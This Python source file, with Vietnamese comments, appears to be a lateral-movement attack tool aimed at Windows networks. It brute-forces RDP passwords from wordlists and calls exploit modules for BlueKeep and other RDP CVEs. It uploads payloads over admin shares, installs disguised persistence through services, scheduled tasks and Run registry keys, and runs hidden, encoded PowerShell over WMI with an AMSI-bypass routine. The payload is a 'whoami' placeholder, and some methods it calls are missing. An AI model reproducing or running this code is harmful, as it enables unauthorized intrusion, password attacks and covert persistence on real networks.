import os
import re
import socket
import logging
import importlib
import base64
from typing import Dict, List, Set, Optional, Any, Tuple
from datetime import datetime
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

from impacket.dcerpc.v5 import transport, scmr, wkst, samr
from impacket.smbconnection import SMBConnection
import wmi
import winrm
from pyrdp.mitm.cli import rdp

@dataclass
class Credential:
    username: str
    password: str
    domain: str = ""
    hash: Optional[str] = None
    key_file: Optional[str] = None
    success_count: int = 0
    last_used: Optional[datetime] = None

@dataclass 
class CompromisedHost:
    ip: str
    hostname: Optional[str]
    os: Optional[str]
    open_ports: Set[int]
    services: Dict[int, Any]
    vulnerabilities: List[Dict]
    access_method: str
    credential: Credential
    timestamp: datetime

class LateralMovement:
    def __init__(self):
        self.credentials: List[Credential] = []
        self.compromised_hosts: Dict[str, CompromisedHost] = {}
        self.logger = logging.getLogger(__name__)
        self.executor = ThreadPoolExecutor(max_workers=10)
        self.max_retries = 3
        self.retry_delay = 5

    def _port_open(self, host: str, port: int) -> bool:
        """Kiểm tra port có mở không"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

    def _rdp_execute(self, target_host: str, cred: Credential) -> bool:
        """Thực thi qua RDP với brute force và các CVE phổ biến"""
        try:
            # Kiểm tra port RDP
            if not self._port_open(target_host, 3389):
                return False
                
            # Thử brute force nếu chưa có credentials thành công
            if not cred.success_count and not cred.hash:
                password = self._rdp_brute_force(target_host, cred.username, cred.domain)
                if password:
                    cred.password = password
                    cred.success_count += 1
                    
            # Thử các CVE phổ biến trước khi kết nối
            vulnerabilities = [
                self._try_bluekeep_exploit,
                self._try_rdp_decompression_exploit,
                self._try_rdp_encryption_exploit
            ]
            
            for exploit in vulnerabilities:
                try:
                    if exploit(target_host, cred):
                        return True
                except Exception as e:
                    self.logger.debug(f"Exploit {exploit.__name__} failed: {str(e)}")
                    continue
                    
            # Thử standard RDP
            try:
                client = rdp.RDPClient(
                    target_host,
                    credentials=(cred.username, cred.password),
                    domain=cred.domain,
                    restricted_admin=False,
                    timeout=10
                )
                client.connect()
                return True
            except Exception as e:
                self.logger.debug(f"RDP connection failed: {str(e)}")
                return False
                
        except Exception as e:
            self.logger.error(f"RDP execution error: {str(e)}")
            return False

    def _rdp_brute_force(self, target_host: str, username: str, domain: str = "") -> Optional[str]:
        """Thử brute force RDP password"""
        wordlists = [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/wordlists/fasttrack.txt',
            './wordlists/common_passwords.txt'
        ]
        
        common_passwords = [
            'password', 'Password1', 'admin', 'administrator',
            '123456', 'qwerty', username, f'{username}123',
            'changeme', 'Welcome123', 'P@ssw0rd', 'letmein'
        ]
        
        # Thử common passwords trước
        for password in common_passwords:
            try:
                client = rdp.RDPClient(
                    target_host,
                    credentials=(username, password),
                    domain=domain,
                    timeout=5
                )
                client.connect()
                self.logger.success(f"Found valid RDP password for {username}: {password}")
                return password
            except Exception:
                continue
                
        # Thử từ wordlists
        for wordlist in wordlists:
            try:
                with open(wordlist, 'r', errors='ignore') as f:
                    for password in f:
                        password = password.strip()
                        try:
                            client = rdp.RDPClient(
                                target_host,
                                credentials=(username, password),
                                domain=domain,
                                timeout=5
                            )
                            client.connect()
                            self.logger.success(f"Found valid RDP password for {username}: {password}")
                            return password
                        except Exception:
                            continue
            except FileNotFoundError:
                continue
                
        return None

    def _try_bluekeep_exploit(self, target_host: str, cred: Optional[Credential] = None) -> bool:
        """Thử khai thác RDP BlueKeep (CVE-2019-0708)"""
        try:
            # Implementation của BlueKeep exploit
            from exploits.bluekeep import BlueKeep
            exploit = BlueKeep(target_host)
            if exploit.check_vulnerable():
                if exploit.execute_exploit():
                    self.logger.success(f"BlueKeep exploit successful on {target_host}")
                    return True
            return False
        except Exception as e:
            self.logger.debug(f"BlueKeep exploit failed: {str(e)}")
            return False

    def _try_rdp_decompression_exploit(self, target_host: str, cred: Optional[Credential] = None) -> bool:
        """Thử khai thác RDP decompression vulnerabilities"""
        try:
            # Implementation của các RDP decompression vulnerabilities
            vulnerabilities = [
                'CVE-2019-1181',  # DejaBlue
                'CVE-2019-1182',  # DejaBlue
                'CVE-2019-1222',  # RDP Service Memory Corruption
                'CVE-2019-1226'   # RDP Service Memory Corruption
            ]
            
            for vuln_id in vulnerabilities:
                try:
                    exploit_module = f"exploits.rdp.{vuln_id.lower()}"
                    exploit = importlib.import_module(exploit_module).Exploit(target_host)
                    if exploit.check_vulnerable():
                        if exploit.execute_exploit():
                            self.logger.success(f"{vuln_id} exploit successful on {target_host}")
                            return True
                except ImportError:
                    continue
            return False
        except Exception as e:
            self.logger.debug(f"RDP decompression exploit failed: {str(e)}")
            return False

    def _try_rdp_encryption_exploit(self, target_host: str, cred: Optional[Credential] = None) -> bool:
        """Thử khai thác RDP encryption vulnerabilities"""
        try:
            # Implementation của các RDP encryption vulnerabilities
            vulnerabilities = [
                'CVE-2018-0886',  # CredSSP
                'CVE-2019-1489',  # Encryption Oracle
                'CVE-2020-0609',  # Windows RD Gateway
                'CVE-2020-0610'   # Windows RD Gateway
            ]
            
            for vuln_id in vulnerabilities:
                try:
                    exploit_module = f"exploits.rdp.{vuln_id.lower()}"
                    exploit = importlib.import_module(exploit_module).Exploit(target_host)
                    if exploit.check_vulnerable():
                        if exploit.execute_exploit():
                            self.logger.success(f"{vuln_id} exploit successful on {target_host}")
                            return True
                except ImportError:
                    continue
            return False
        except Exception as e:
            self.logger.debug(f"RDP encryption exploit failed: {str(e)}")
            return False
            
    def _try_admin_share(self, target_host: str, cred: Credential) -> bool:
        """Thử kết nối và khai thác Windows Admin Shares"""
        admin_shares = ['ADMIN$', 'C$', 'IPC$']
        
        try:
            # Kết nối SMB
            smb = SMBConnection(target_host, target_host)
            if cred.hash:
                smb.login(cred.username, "", cred.domain, cred.hash)
            else:
                smb.login(cred.username, cred.password, cred.domain)
                
            for share in admin_shares:
                try:
                    # Kiểm tra quyền truy cập
                    smb.listPath(share, '*')
                    self.logger.info(f"Access granted to {share} on {target_host}")
                    
                    if share != 'IPC$':
                        # Upload và thực thi payload
                        self._deploy_payload_via_share(smb, share, target_host)
                        
                        # Thiết lập persistence
                        persistence_methods = [
                            self._install_service_persistence,
                            self._install_scheduled_task_persistence,
                            self._install_registry_persistence
                        ]
                        
                        for method in persistence_methods:
                            try:
                                if method(smb, share, target_host, cred):
                                    return True
                            except Exception as e:
                                self.logger.debug(f"Persistence method {method.__name__} failed: {str(e)}")
                                continue
                                
                except Exception:
                    continue
                    
            return False
            
        except Exception as e:
            self.logger.debug(f"Admin share access failed: {str(e)}")
            return False

    def _install_service_persistence(self, smb: SMBConnection, share: str, target_host: str, cred: Credential) -> bool:
        """Cài đặt persistence qua Windows Service"""
        try:
            service_name = f"Windows_{self._generate_random_string(8)}"
            exe_name = f"{self._generate_random_string(8)}.exe"
            service_path = f"\\\\{target_host}\\{share}\\{exe_name}"
            
            # Upload payload được mã hóa
            encrypted_payload = self._encrypt_payload(self._get_payload_content())
            smb.putFile(share, exe_name, encrypted_payload)
            
            # Tạo và cấu hình service
            rpctransport = transport.SMBTransport(
                target_host, 445, r'\ADMIN$',
                cred.username, cred.password, cred.domain
            )
            
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)
            
            handle = scmr.hROpenSCManagerW(dce)
            service_handle = scmr.hRCreateServiceW(
                dce,
                handle,
                service_name,
                service_name,
                lpBinaryPathName=service_path,
                dwStartType=scmr.SERVICE_AUTO_START
            )
            
            # Start service
            try:
                scmr.hRStartServiceW(dce, service_handle)
            except Exception:
                pass
                
            return True
            
        except Exception as e:
            self.logger.debug(f"Service persistence failed: {str(e)}")
            return False

    def _install_scheduled_task_persistence(self, smb: SMBConnection, share: str, target_host: str, cred: Credential) -> bool:
        """Cài đặt persistence qua Scheduled Task"""
        try:
            task_name = f"Windows_{self._generate_random_string(8)}"
            exe_name = f"{self._generate_random_string(8)}.exe"
            
            # Upload payload được mã hóa
            encrypted_payload = self._encrypt_payload(self._get_payload_content())
            smb.putFile(share, exe_name, encrypted_payload)
            
            # Tạo scheduled task
            command = f"""schtasks /create /tn {task_name} /tr "\\\\{target_host}\\{share}\\{exe_name}" /sc onstart /ru system /f"""
            smb.executeCommand(command)
            
            # Start task
            smb.executeCommand(f"schtasks /run /tn {task_name}")
            
            return True
            
        except Exception as e:
            self.logger.debug(f"Scheduled task persistence failed: {str(e)}")
            return False

    def _install_registry_persistence(self, smb: SMBConnection, share: str, target_host: str, cred: Credential) -> bool:
        """Cài đặt persistence qua Registry"""
        try:
            exe_name = f"{self._generate_random_string(8)}.exe"
            reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            reg_key = f"Windows_{self._generate_random_string(8)}"
            
            # Upload payload được mã hóa
            encrypted_payload = self._encrypt_payload(self._get_payload_content())
            smb.putFile(share, exe_name, encrypted_payload)
            
            # Thêm registry key
            command = f"reg add \\\\{target_host}\\HKLM\\{reg_path} /v {reg_key} /t REG_SZ /d \"{share}\\{exe_name}\" /f"
            smb.executeCommand(command)
            
            return True
            
        except Exception as e:
            self.logger.debug(f"Registry persistence failed: {str(e)}")
            return False

    def _wmi_execute(self, target_host: str, cred: Credential) -> bool:
        """Thực thi và cài đặt persistence qua WMI"""
        try:
            # Kết nối WMI
            connection = wmi.WMI(
                target_host,
                user=f"{cred.domain}\\{cred.username}" if cred.domain else cred.username,
                password=cred.password
            )
            
            # Thử các phương thức khác nhau
            wmi_methods = [
                self._wmi_process_create,
                self._wmi_service_install,
                self._wmi_event_subscription,
                self._wmi_powershell_execute
            ]
            
            for method in wmi_methods:
                try:
                    if method(connection, target_host, cred):
                        return True
                except Exception as e:
                    self.logger.debug(f"WMI method {method.__name__} failed: {str(e)}")
                    continue
                    
            return False
            
        except Exception as e:
            self.logger.debug(f"WMI execution failed: {str(e)}")
            return False

    def _wmi_powershell_execute(self, connection: wmi.WMI, target_host: str, cred: Credential) -> bool:
        """Thực thi PowerShell thông qua WMI"""
        try:
            script = f"""
            $ErrorActionPreference = 'SilentlyContinue'
            $payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{self._get_encoded_payload()}'))
            
            # Bypass AMSI
            $a=[Ref].Assembly.GetTypes()
            ForEach($b in $a) {{
                if ($b.Name -like "*iUtils") {{
                    $c=$b
                }}
            }}
            $d=$c.GetFields('NonPublic,Static')
            ForEach($e in $d) {{
                if ($e.Name -like "*Context") {{
                    $f=$e
                }}
            }}
            $g=$f.GetValue($null)
            [IntPtr]$ptr = $g
            [Int32[]]$buf = @(0)
            [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
            
            # Execute payload
            Invoke-Expression $payload
            """
            
            # Encode và thực thi script
            encoded_script = base64.b64encode(script.encode('utf16le')).decode()
            process_id = connection.Win32_Process.Create(
                CommandLine=f"powershell.exe -nop -w hidden -enc {encoded_script}",
                CurrentDirectory="C:\\Windows\\System32"
            )
            
            return process_id[0] == 0
            
        except Exception as e:
            self.logger.debug(f"PowerShell execution failed: {str(e)}")
            return False

    def _encrypt_payload(self, payload: bytes) -> bytes:
        """Mã hóa payload trước khi upload"""
        try:
            from cryptography.fernet import Fernet
            key = Fernet.generate_key()
            cipher_suite = Fernet(key)
            encrypted_data = cipher_suite.encrypt(payload)
            return encrypted_data
        except Exception as e:
            self.logger.error(f"Payload encryption failed: {str(e)}")
            return payload

    def _get_encoded_payload(self) -> str:
        """Lấy payload đã được encode base64"""
        return base64.b64encode(self._get_payload_content()).decode()

    def _get_encoded_powershell_payload(self) -> str:
        """Tạo và encode PowerShell payload"""
        script = f"""
        $ErrorActionPreference = 'SilentlyContinue'
        $payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{self._get_encoded_payload()}'))
        Invoke-Expression $payload
        """
        return base64.b64encode(script.encode('utf16le')).decode()

    def _generate_random_string(self, length: int = 8) -> str:
        """Tạo random string cho tên file/service"""
        import random
        import string
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def _get_payload_content(self) -> bytes:
        """Lấy nội dung của payload"""
        # TODO: Implement actual payload content
        return b"whoami"